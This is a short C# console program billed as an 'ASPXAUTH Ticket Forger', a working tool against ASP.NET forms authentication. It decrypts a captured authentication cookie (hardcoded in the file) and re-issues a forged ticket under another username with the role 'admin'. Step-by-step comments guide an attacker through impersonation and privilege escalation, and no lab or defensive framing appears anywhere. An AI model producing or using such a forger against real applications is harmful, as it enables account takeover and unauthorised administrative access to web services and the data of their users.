using System;
using System.Web.Security;
using System.Configuration;
using System.Web.Configuration;

namespace FormsEncryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("== ASPXAUTH Ticket Forger ==");

            // 🔐 Step 1: Paste captured ASPXAUTH cookie here (from Burp, browser, etc.)
            string encryptedTicket = "AF0F3C54C52848FF2D4F8CFBEEEBA82691DD357FACC8CAF47A6284527CB63E116102FED046D4131C1C966B625A3BF7637ED2C0F375ECFC54A2C71A3D79CC6FEA16D98E8635C0079873284D78EE2921F764ABAD7EA54DB42CF23EA8A989BA87A6E5A505BBC6432289B00749DEB1569FD0C332A23201925D4EA8845775C6276E7DA8113343C1C615BE05A4D4BD0B64676C468EBA3BB8B82D9D09098B6203E4B9A9";

            // ✅ Step 2: Decrypt the original ticket
            FormsAuthenticationTicket original;
            try
            {
                original = FormsAuthentication.Decrypt(encryptedTicket);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to decrypt original ticket: " + ex.Message);
                return;
            }

            Console.WriteLine("[+] Original ticket:");
            Console.WriteLine("    Username : " + original.Name);
            Console.WriteLine("    UserData : " + original.UserData);
            Console.WriteLine("    Issued   : " + original.IssueDate);
            Console.WriteLine("    Expires  : " + original.Expiration);
            Console.WriteLine();

            // ✏️ Step 3: Modify username and roles
            string newUsername = "user1";            // << change to any user
            string newRoles = "admin";                   // << escalate role (if app uses UserData)

            // 🧪 Step 4: Create new forged ticket
            FormsAuthenticationTicket forgedTicket = new FormsAuthenticationTicket(
                original.Version,
                newUsername,
                DateTime.Now,
                DateTime.Now.AddMinutes(120),
                original.IsPersistent,
                newRoles,
                original.CookiePath
            );

            // 🔐 Step 5: Encrypt the new ticket
            string forgedEncryptedTicket = FormsAuthentication.Encrypt(forgedTicket);

            Console.WriteLine("[+] Forged ASPXAUTH Cookie:");
            Console.WriteLine(forgedEncryptedTicket);
        }
    }
}
